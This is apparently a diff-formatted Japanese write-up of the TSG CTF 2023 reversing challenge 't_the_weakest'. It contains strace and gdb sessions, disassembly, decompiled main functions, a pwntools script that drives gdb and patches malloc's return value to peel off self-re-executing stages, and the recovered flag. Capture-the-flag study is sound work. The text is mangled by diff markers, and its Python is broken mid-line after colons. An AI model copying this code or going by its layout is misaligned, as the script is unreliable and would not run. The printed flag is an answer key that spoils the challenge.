 t_the_weakest: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), BuildID[sha1]=4890da9fdfbb0b21eb3cfb1a9974eb32558f4e51, for GNU/Linux 3.2.0, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, no section header
 $
-```
-
-
-
-```
-LOAD:00000000000010A0 ; int __fastcall main(int, char **, char **)
-LOAD:00000000000010A0 main proc near
-LOAD:00000000000010A0
-LOAD:00000000000010A0 s= byte ptr -12C08Bh
-LOAD:00000000000010A0 bufSize1228883= byte ptr -12C06Bh
-LOAD:00000000000010A0 var_18= byte ptr -18h
-LOAD:00000000000010A0
-LOAD:00000000000010A0 push r12
-LOAD:00000000000010A2 push rbp
-LOAD:00000000000010A3 push rbx
-LOAD:00000000000010A4 sub rsp, 12C080h
-```
-
-
-
-```
+LOAD:
+00000000000010A0 ; int __fastcall main(int, char **, char **)
+LOAD:
+00000000000010A0 main proc near
+LOAD:
+00000000000010A0
+LOAD:
+00000000000010A0 s= byte ptr -12C08Bh
+LOAD:
+00000000000010A0 bufSize1228883= byte ptr -12C06Bh
+LOAD:
+00000000000010A0 var_18= byte ptr -18h
+LOAD:
+00000000000010A0
+LOAD:
+00000000000010A0 push r12
+LOAD:
+00000000000010A2 push rbp
+LOAD:
+00000000000010A3 push rbx
+LOAD:
+00000000000010A4 sub rsp, 12C080h
 $ strace ./t_the_weakest 'TSGCTF{DUMMY}' 2>&1 | grep -e '^read' -e 'write' -e 'execve'
 execve("./t_the_weakest", ["./t_the_weakest", "TSGCTF{DUMMY}"], 0x7ffdce594b98 /* 24 vars */) = 0
 read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\237\2\0\0\0\0\0"..., 832) = 832
@@ -1356,11 +1177,6 @@ execve("/proc/self/fd/3", ["./t_the_weakest", "DUMMY}"], 0x7fff19edcf00 /* 24 va
 read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\237\2\0\0\0\0\0"..., 832) = 832
 write(1, "ng\n", 3ng
 $
-```
-
-
-
-```
 $ gdb -q ./t_the_weakest [/mnt/d/Documents/work/ctf/TSG_CTF_2023/t_the_weakest]
 Reading symbols from ./t_the_weakest...
 (No debugging symbols found in ./t_the_weakest)
@@ -1381,11 +1197,6 @@ Legend: code, data, rodata, value
 gdb-peda$ b write
 Function "write" not defined.
 gdb-peda$
-```
-
-
-
-```
 $ gdb -q -n ./t_the_weakest
 Reading symbols from ./t_the_weakest...
 (No debugging symbols found in ./t_the_weakest)
@@ -1399,11 +1210,6 @@ Function "write" not defined.
 Make breakpoint pending on future shared library load? (y or [n]) y
 Breakpoint 1 (write) pending.
 (gdb)
-```
-
-
-
-```
 __int64 __fastcall main(int a1, char **a2, char **a3)
 {
  __int64 v3; // rbx
@@ -1435,11 +1241,6 @@ __int64 __fastcall main(int a1, char **a2, char **a3)
  execv(s, a2);
  return 0LL;
 }
-```
-
-
-
-```
 __int64 __fastcall main(int a1, char **a2, char **a3)
 {
  __int64 v3; // rdx
@@ -1470,21 +1271,11 @@ __int64 __fastcall main(int a1, char **a2, char **a3)
  execv(s, a2);
  return 0LL;
 }
-```
-
-
-
-```
 0x5555555550c3: call 0x555555555060
 => 0x5555555550c8: lea rdx,[rip+0xe0f92] # 0x555555636061
  0x5555555550cf: sub rax,rdx
  0x5555555550d2: cmp rax,0x20000
  0x5555555550d8: jg 0x5555555550e1
-```
-
-
-
-```
 __int64 __fastcall main(int a1, char **a2, char **a3)
 {
  char v3; // al
@@ -1528,11 +1319,6 @@ locPrintNgAndExit:
  execv(s, a2);
  return 0LL;
 }
-```
-
-
-
-```
 #!/usr/bin/env python3
 
 import pwn
@@ -1543,11 +1329,15 @@ import subprocess
 
 # pwn.context.log_level = "DEBUG"
 
-def extract_core(elf_path:str, next_elf_path_to_save:str, flag_to_input:str)->bool:
+def extract_core(elf_path:
+str, next_elf_path_to_save:
+str, flag_to_input:
+str)->bool:
  prompt = b"(gdb)" # 環境に合わせて定義調整してください
  # prompt = b"gdb-peda$"
  with pwn.process(["gdb", "-q", "-n", "--args", "./"+elf_path, flag_to_input]) as io:
- def extract_register_value(register_name:bytes)->int:
+ def extract_register_value(register_name:
+bytes)->int:
  io.sendlineafter(prompt, b"info register %s" % register_name)
  line = io.recvline_contains(register_name)
  return int(line.split()[1], 16)
@@ -1590,7 +1380,8 @@ def extract_core(elf_path:str, next_elf_path_to_save:str, flag_to_input:str)->bo
  io.sendlineafter(prompt, b"continue")
  else:
  # 戻り値改ざん
- print(f"malloc({size_to_allocate:08x})")
+ print(f"malloc({size_to_allocate:
+08x})")
  io.sendlineafter(prompt, b"fin")
  io.sendlineafter(prompt, b"set $rax=0x8000000000000000")
  io.sendlineafter(prompt, b"continue")
@@ -1637,11 +1428,6 @@ def solve():
  else:
  raise Exception("Can not found flag...")
 solve()
-```
-
-
-
-```
 $ time ./solve.py
 count = 1, c = ' '
 [+] Starting local process '/usr/bin/gdb': pid 3320
@@ -1661,20 +1447,10 @@ count = 100, c = '}'
 bytearray(b'TSGCTF{hint_do_scripting_RdJ5GNjKkUidxjcGN4o7j5Wxz1Feo19Q0_hop3_you_did_no7_s0lve_manu4l1y_vNbwVTKw}')
 ./solve.py 2104.89s user 228.59s system 94% cpu 41:10.62 total
 $
-```
-
-
-
-```
 $ time ./t_the_weakest 'TSGCTF{hint_do_scripting_RdJ5GNjKkUidxjcGN4o7j5Wxz1Feo19Q0_hop3_you_did_no7_s0lve_manu4l1y_vNbwVTKw}'
 🎉
 ./t_the_weakest 0.67s user 0.07s system 93% cpu 0.797 total
 $
-```
-
-
-
-```
 TSG CTF 2023に参加いただきありがとうございます！！🥰
 
 今後の参考とするため、アンケートへのご協力をお願いします。
